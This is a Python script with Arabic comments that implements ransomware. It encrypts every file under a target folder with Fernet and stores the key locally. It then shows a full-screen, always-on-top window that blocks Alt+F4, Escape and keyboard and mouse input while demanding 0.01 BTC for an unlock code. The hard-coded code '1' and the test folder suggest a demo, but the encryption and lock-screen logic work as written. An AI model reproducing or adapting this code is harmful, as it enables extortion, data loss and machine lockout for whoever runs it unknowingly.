import os
from cryptography.fernet import Fernet
import tkinter as tk
import ctypes

# === إعدادات ===
TARGET_DIR = os.path.expanduser("~/Desktop/test")  # ← غيّره إذا أردت
KEY_FILE = os.path.expanduser("~/keyfile.txt")

# === توليد أو تحميل المفتاح ===
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()

cipher = Fernet(key)

# === تشفير الملفات ===
def encrypt_all():
    for root, _, files in os.walk(TARGET_DIR):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(filepath, "wb") as f:
                    f.write(encrypted)
            except:
                pass

# === فك التشفير ===
def decrypt_all():
    for root, _, files in os.walk(TARGET_DIR):
        for name in files:
            filepath = os.path.join(root, name)
            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                decrypted = cipher.decrypt(data)
                with open(filepath, "wb") as f:
                    f.write(decrypted)
            except:
                pass

# === تعطيل Alt+F4 + Esc (ضمن نافذة tkinter) ===
def disable_event():
    pass

# === واجهة المستخدم ===
def launch_gui():
    root = tk.Tk()
    root.title("YOUR FILES ARE ENCRYPTED")
    root.configure(bg="black")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)  # تبقى فوق كل النوافذ
    root.protocol("WM_DELETE_WINDOW", disable_event)
    root.bind("<Alt-F4>", lambda e: "break")
    root.bind("<Escape>", lambda e: "break")

    # منع Task Switching في Windows (مؤقت)
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass

    label1 = tk.Label(root, text="YOUR FILES ARE ENCRYPTED!", fg="red", bg="black", font=("Arial", 22))
    label1.pack(pady=30)

    label2 = tk.Label(root, text="Send 0.01 BTC to unlock.\nThen enter the unlock code:", fg="white", bg="black", font=("Arial", 14))
    label2.pack(pady=10)

    entry = tk.Entry(root, font=("Arial", 16), width=20)
    entry.pack(pady=10)

    def unlock():
        if entry.get() == "1":
            decrypt_all()
            if os.path.exists(KEY_FILE):
                os.remove(KEY_FILE)
            try:
                ctypes.windll.user32.BlockInput(False)
            except:
                pass
            root.destroy()
        else:
            label3.config(text="Incorrect code", fg="red")

    tk.Button(root, text="UNLOCK", font=("Arial", 14), command=unlock, bg="gray", fg="white").pack(pady=10)

    label3 = tk.Label(root, text="", bg="black", fg="green", font=("Arial", 12))
    label3.pack(pady=10)

    root.mainloop()

# === التشغيل ===
if not os.path.exists(KEY_FILE):
    encrypt_all()

launch_gui()

